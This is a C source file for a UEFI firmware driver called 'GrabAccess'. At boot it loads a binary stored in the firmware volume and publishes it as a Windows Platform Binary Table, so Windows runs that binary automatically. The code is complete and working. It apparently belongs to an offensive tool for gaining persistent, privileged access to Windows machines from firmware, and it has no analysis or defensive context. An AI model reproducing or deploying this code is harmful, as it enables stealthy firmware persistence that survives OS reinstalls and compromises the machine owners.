#include "GrabAccessDXE.h"

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/BaseLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/DebugLib.h>

#include <Protocol/AcpiTable.h>
#include <Protocol/FirmwareVolume2.h>

#include <IndustryStandard/Acpi50.h>

#include <Guid/EventGroup.h>
#include <Guid/EventLegacyBios.h>


UINTN     mPlatformBinaryResourceTableKey = 0;
EFI_GUID  mFileGuid;
UINT16    mArgLength;
BOOLEAN   mAcpiWpbtInstalled = FALSE;
EFI_ACPI_5_0_PLATFORM_BINARY_TABLE *mPlatformBinaryTable;


EFI_STATUS InstallWpbt ( IN EFI_GUID *FileGuid, IN UINT16 ArgLength, IN CHAR16 *Arg )
{
  EFI_STATUS                    Status;
  EFI_ACPI_TABLE_PROTOCOL       *AcpiTableProtocol;

  UINTN                         FvHandleCount;
  EFI_HANDLE                    *FvHandleBuffer;
  UINTN                         Index;
  EFI_FIRMWARE_VOLUME2_PROTOCOL *Fv;

  UINT8                         *LoadBuffer;
  UINTN                         Size;
  UINT32                        AuthenticationStatus;
  UINT8                         Temp;
  EFI_GUID                      ZeroGuid;

  CHAR16    *PtrArg;


  if (mAcpiWpbtInstalled) {
    return EFI_SUCCESS;
  }

  //
  // variables initialization
  //
  LoadBuffer = &Temp;
  Size = 1;
  Fv = NULL;

  ZeroMem (&ZeroGuid, sizeof (EFI_GUID));
  CopyGuid (&mFileGuid, FileGuid);
  if (CompareGuid (&ZeroGuid, &mFileGuid)) {
    DEBUG ((EFI_D_ERROR , "GrabAccess: FileGuid Error\n"));
    return EFI_INVALID_PARAMETER;
  }

  //
  // ArgLength should be multiples of sizeof (CHAR16)
  //
  if ((ArgLength % (sizeof (CHAR16))) != 0) {
    DEBUG ((EFI_D_ERROR, "GrabAccess: Invalid ArgLength: (%d) \n", ArgLength));
    return EFI_INVALID_PARAMETER;
  }

  mArgLength = ArgLength;

  //
  // allocate real PlatformBinaryTable
  //
  gBS->AllocatePool ( EfiRuntimeServicesData, (sizeof (EFI_ACPI_5_0_PLATFORM_BINARY_TABLE) + mArgLength), (VOID **)&mPlatformBinaryTable );

  CopyMem (mPlatformBinaryTable, &mPlatformBinaryTableTemplate, sizeof (EFI_ACPI_5_0_PLATFORM_BINARY_TABLE));
  //
  // update Header->Length
  //
  mPlatformBinaryTable->Header.Length = (UINT32)(sizeof (EFI_ACPI_5_0_PLATFORM_BINARY_TABLE) + mArgLength);

  if (mArgLength > 0) {
    PtrArg = (CHAR16 *)((UINT8 *)(mPlatformBinaryTable) + sizeof (EFI_ACPI_5_0_PLATFORM_BINARY_TABLE));
    CopyMem (PtrArg, Arg, mArgLength);
  }  //end if (>0)

  Status = gBS->LocateProtocol (&gEfiAcpiTableProtocolGuid, NULL, (VOID **) &AcpiTableProtocol);
  if (EFI_ERROR (Status)) {
    DEBUG ((EFI_D_ERROR, "GrabAccess: Locate AcpiTableProtocol failed: (%r) \n", Status));
    return Status;
  }

  //
  // Locate binary file location
  //
  gBS->LocateHandleBuffer ( ByProtocol, &gEfiFirmwareVolume2ProtocolGuid, NULL, &FvHandleCount, &FvHandleBuffer );

  for (Index = 0; Index < FvHandleCount; Index++) {
    gBS->HandleProtocol ( FvHandleBuffer[Index], &gEfiFirmwareVolume2ProtocolGuid, (VOID **) &Fv );

    //
    // the binary file is encapsulated as EFI_SECTION_RAW
    //
    Status = Fv->ReadSection ( Fv, &mFileGuid, EFI_SECTION_RAW, 0, (VOID **)&LoadBuffer, &Size, &AuthenticationStatus );

    if (Status == EFI_WARN_BUFFER_TOO_SMALL || Status == EFI_BUFFER_TOO_SMALL) {

      LoadBuffer = NULL;
      Status = gBS->AllocatePool (
		      EfiACPIReclaimMemory,
		      Size,
		      (VOID **)&LoadBuffer
		      );

      Status = Fv->ReadSection ( Fv, &mFileGuid, EFI_SECTION_RAW, 0, (VOID **)&LoadBuffer, &Size, &AuthenticationStatus );
      if (EFI_ERROR (Status)) {
        DEBUG ((EFI_D_ERROR, "GrabAccess: ReadSection with LoadBuffer failed: (%r) \n", Status));
        return Status;
      }
    }  //end if (BUFFER_TOO_SMALL)

    if (!EFI_ERROR (Status)) {
      break;
    }
  }  //end for (Index)

  //
  // can't read the file
  //
  if (Index == FvHandleCount) {
    DEBUG ((EFI_D_ERROR, "GrabAccess: Can not ReadFile: (%r) \n", Status));
    return Status;
  }

  //
  // initialize WPBT members
  //
  mPlatformBinaryTable->BinarySize = (UINT32)Size;
  mPlatformBinaryTable->BinaryLocation = (UINT64)(UINTN)LoadBuffer;
  mPlatformBinaryTable->Layout = 0x01;
  mPlatformBinaryTable->Type = 0x01;
  mPlatformBinaryTable->ArgLength = mArgLength;
  //
  // Update Checksum.
  //
  UINTN ChecksumOffset;
  ChecksumOffset = OFFSET_OF (EFI_ACPI_DESCRIPTION_HEADER, Checksum);
  ((UINT8 *)mPlatformBinaryTable)[ChecksumOffset] = 0;
  ((UINT8 *)mPlatformBinaryTable)[ChecksumOffset] = CalculateCheckSum8 ((UINT8 *)mPlatformBinaryTable, (sizeof (EFI_ACPI_5_0_PLATFORM_BINARY_TABLE) + mPlatformBinaryTable->ArgLength));

  //
  // Publish Windows Platform Binary Table.
  //
  Status = AcpiTableProtocol->InstallAcpiTable ( AcpiTableProtocol, mPlatformBinaryTable, (sizeof (EFI_ACPI_5_0_PLATFORM_BINARY_TABLE) + mPlatformBinaryTable->ArgLength), &mPlatformBinaryResourceTableKey );
  if (EFI_ERROR (Status)) {
    DEBUG ((EFI_D_ERROR, "GrabAccess: InstallAcpiTable failed: (%r) \n", Status));
    return Status;
  }

  mAcpiWpbtInstalled = TRUE;
  DEBUG ((EFI_D_INFO , "GrabAccess: WPBT Installed\n"));
  gBS->FreePool (mPlatformBinaryTable);
  mPlatformBinaryTable = NULL;

  return Status;
}


VOID EFIAPI ReadyToBootEventNotify ( IN EFI_EVENT Event, IN VOID *Context )
{
  UINTN       ArgLen;

  CHAR16 InputArg[] = L"";
  ArgLen = StrSize(InputArg);

  InstallWpbt (&FileGuid, (UINT16)ArgLen, InputArg);
  gBS->CloseEvent (Event);
}


EFI_STATUS EFIAPI GrabAccessEntry (IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
{
  EFI_STATUS  Status;
  EFI_EVENT   ReadyToBootEvent;

  Status = gBS->CreateEventEx (EVT_NOTIFY_SIGNAL, TPL_CALLBACK, ReadyToBootEventNotify, NULL, &gEfiEventReadyToBootGuid, &ReadyToBootEvent );
  //Status = gBS->CreateEventEx (EVT_NOTIFY_SIGNAL, TPL_CALLBACK, ReadyToBootEventNotify, NULL, &gEfiEventLegacyBootGuid, &ReadyToBootEvent);   //Not Support Legacy Env
  if (EFI_ERROR (Status)) 
    DEBUG ((EFI_D_ERROR , "GrabAccess: CreateEventEx(gEfiEventReadyToBootGuid) failed: (%r) \n", Status));
  else
    DEBUG ((EFI_D_INFO , "GrabAccess: Event gEfiEventReadyToBootGuid Created\n"));

  return Status;
}